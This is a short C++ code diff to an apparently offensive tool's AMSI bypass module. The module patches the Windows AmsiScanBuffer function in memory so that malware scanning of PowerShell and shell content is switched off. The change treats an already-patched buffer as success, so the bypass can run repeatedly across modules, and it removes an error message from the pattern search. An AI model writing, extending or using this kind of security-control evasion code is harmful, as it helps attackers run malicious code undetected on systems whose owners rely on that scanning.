@@ -118,7 +118,16 @@ BOOL modAmsiScan()
         return FALSE;
 
     if (!modFindOffset(reinterpret_cast<LPVOID>(pAmsiScanBuffer), bPattern, ARRAYSIZE(bPattern), 100, &dwPatternOffset))
+    {
+        // The native AMSI patch survives the PowerShell AppDomain and the
+        // ShellPower DLL. A later module or live-shell invocation therefore
+        // sees the replacement bytes instead of the original instruction.
+        // Treat that state as success so repeated use is idempotent.
+        if (modFindOffset(reinterpret_cast<LPVOID>(pAmsiScanBuffer), bPatch, ARRAYSIZE(bPatch), 100, &dwPatternOffset))
+            return TRUE;
+
         return FALSE;
+    }
 
     //wprintf(L"[*] Found instruction to patch in AmsiScanBuffer @ 0x%llx (offset: %d)\n", pAmsiScanBuffer + dwPatternOffset, dwPatternOffset);
 
@@ -265,9 +274,6 @@ BOOL modFindOffset(LPVOID pStartAddress, LPBYTE pBuffer, DWORD dwBufferSize, DWO
             break;
         }
     }
-
-    if (!bResult)
-        PRINT_ERROR("Failed to find pattern of size %d within the address range 0x%llx - 0x%llx\n", dwBufferSize, (ULONG_PTR)pStartAddress, (ULONG_PTR)pStartAddress + dwMaxSize);
 
     return bResult;
 }
